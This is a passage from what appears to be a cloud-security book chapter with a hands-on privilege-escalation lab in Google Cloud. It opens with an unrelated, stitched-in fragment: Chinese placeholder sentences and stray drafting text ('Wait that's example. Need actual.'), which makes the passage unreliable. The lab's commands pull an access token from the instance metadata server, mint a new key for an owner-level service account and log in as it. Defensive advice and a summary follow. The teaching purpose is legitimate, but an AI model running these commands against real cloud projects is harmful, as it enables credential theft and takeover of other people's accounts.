
进入 `/path/to/xxx` 目录，找到 `xxx.json`。

在表达式 `cvar = avar + bvar` 中，加法运算符（`+`）将 `avar` 与 `bvar` 相加，得到它们的和 `cvar`

在 `List.of(arg0, arg1, arg2)` 中，`List` 接口的工厂方法 `of()` 接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用 `cmd` 命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```
[/content]

Wait that's example. Need actual.

Let's produce final.

[content]
```
curl -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/scopes"
```

This returns the following output:

```
https://www.googleapis.com/auth/cloud-platform
```

Retrieve an access token for the VM’s default service account from the instance metadata server:

```
curl -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/token"
```

You should get the following JSON response:

```
{"access_token":"...","expires_in":...,"token_type":"Bearer"}
```

Copy the value of `access_token` from the JSON output of the previous step.

Exit the SSH session:

```
exit
```

### 4. Store the value of the access token in a variable:

```
SUPERADMIN_ACCESS_TOKEN="[ACCESS TOKEN]"
```

Make sure to replace `[ACCESS TOKEN]` with the access token.

### 5. Store the email address of the service account (`superadmin@....iam.gserviceaccount.com`) in a variable:

```
SUPERADMIN_EMAIL="[EMAIL]"
```

Make sure to replace `[EMAIL]` with the email address of the service account that starts with `superadmin`.

### 6. Generate a new service account key and then save it locally:

```
cd ~

BASE_URL="https://iam.googleapis.com/v1"
PROJECT_PATH="projects/$PROJECT_ID"
SERVICE_ACCOUNT="serviceAccounts/$SUPERADMIN_EMAIL"

curl -s -X POST \
  -H "Authorization: Bearer $SUPERADMIN_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "$BASE_URL/$PROJECT_PATH/$SERVICE_ACCOUNT/keys" \
  -d '{}' \
  | jq -r '.privateKeyData' | base64 --decode > superadmin-key-02.json
```

#### Tip

You can verify that `superadmin-key-02.json` exists by running `cat superadmin-key-02.json`.

### 7. Use the generated key to authenticate as the service account associated with the `roles/owner` role:

```
export SUPERADMIN_CREDENTIALS="superadmin-key-02.json"

gcloud auth activate-service-account \
  --key-file=$SUPERADMIN_CREDENTIALS

PROJECT_ID=$(cat superadmin-key-02.json | jq -r ".project_id")
gcloud config set project $PROJECT_ID
```

### 8. List all authenticated `gcloud` accounts:

```
gcloud auth list
```

This yields the following output:

```
Credentialed Accounts

...

ACTIVE:
ACCOUNT: html-to-pdf@....iam.gserviceaccount.com

ACTIVE: *
ACCOUNT: superadmin@....iam.gserviceaccount.com

To set the active account, run:
    $ gcloud config set account `ACCOUNT`
```

Here, the `superadmin@…​.iam.gserviceaccount.com` account is currently active, as indicated by the `*` in the ACTIVE column.

### 9. Check the IAM roles assigned to the service account to verify that it is associated with the `roles/owner` role:

```
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$SUPERADMIN_EMAIL"
```

This outputs the following:

```
ROLE: roles/owner
```

You should now have a good idea of how overly permissive service accounts can allow attackers to escalate privileges beyond their initial access scope. From this point, an attacker can perform unrestricted actions across the project, including modifying IAM policies, creating or deleting resources, deploying malicious workloads, accessing sensitive data, and installing backdoors to maintain long-term persistence within the account.

Another route an attacker can take is to create a new API key—an encrypted string that allows applications to call various Google Cloud APIs, such as the Cloud Translation API and the Cloud Vision API—and use it to directly access Google Cloud services enabled in the serverless lab environment, as shown in [Figure 10-5](#ch10.html#ch10-generate-api-key-intro).

![](assets/lsse_1005.png)

An attacker who successfully generates or obtains an API key could use it directly in a rogue project to make unauthorized requests and interact with Google Cloud services without using the credentials of the compromised service account. To generate a new API key, an attacker can authenticate as a service account that has the relevant `apikeys.keys.*` permissions, such as those granted by the `roles/​serv⁠iceusage.apiKey⁠s​Admin` role.^[17](#ch10.html#id899) Since the `superadmin@…​.iam.gserviceaccount.com` service account has been granted the `roles/owner` role (which already includes the `apikeys.keys.*` permissions), the attacker can create and manage API keys without requiring additional permissions.

From a defensive security standpoint, it’s critical to actively check for service accounts with elevated permissions and restrict their usage to only specific resources to limit the ability of attackers to escalate privileges through service accounts. You must also actively audit any existing API keys in each project, verify their permissions, and revoke any keys that are suspicious or potentially compromised.^[18](#ch10.html#id900) You should consider using automated tools and services to continuously monitor for misconfigurations, detect unauthorized API key usage, and enforce least-privilege access across all service accounts and projects.

#### Caution

Now that you’ve completed the hands-on examples in this and the previous two chapters, make sure to review and delete all resources you created in your Google Cloud accounts. Leaving resources that are no longer in use may lead to unnecessary charges and leave your account exposed to potential security risks.

# Summary

In this chapter, you dived deeper into how attackers can leverage their initial access to set up a backdoor, escalate privileges, and compromise other resources in the cloud account. You started by setting a lower request timeout to limit the attacker’s window for running malicious commands inside a reverse shell session—only to realize this measure alone cannot fully protect the application from attackers who know how to bypass such constraints. After completing the attack simulation that included setting up a backdoor, you further reduced the request timeout setting of the vulnerable Cloud Run service to 10 seconds and significantly reduced the permissions of the associated service account as well. Right after implementing these changes in the serverless lab environment, you simulated how an attacker could bypass the new timeout and permission restrictions by avoiding the use of a reverse shell. Finally, you explored multiple strategies and approaches that an attacker could use to abuse misconfigurations and escalate privileges within a Google Cloud account.

In the next chapter, you’ll shift your focus to Microsoft Azure and examine how attackers can exploit vulnerable Azure Functions. As you go through the simulations and hands-on examples, you’ll learn how to recognize various types of misconfigurations and secure them against potential threats.

^[1](#ch10.html#id862-marker) You can optionally paste the output into a local text editor.

^[2](#ch10.html#id868-marker) You can find this script in a [GitHub gist (see `remove_iam_policy_binding.sh`)](https://oreil.ly/0mSPU). Note that you may need to browse through the pages to locate it.

^[3](#ch10.html#id873-marker) This assumes `ngrok` is already installed and fully configured on your local machine (for example, your `ngrok` authtoken is set up, and you have permission to open tunnels). If not, follow the official `ngrok` setup instructions before running the tunnel.

^[4](#ch10.html#id877-marker) If the `INPUT_BUCKET` variable is already set, you can skip this step.

^[5](#ch10.html#id878-marker) If the `NGROK_URL` variable is already set, you can skip this step.

^[6](#ch10.html#id879-marker) Expect a different encoded string output because your `ngrok` URL is different.
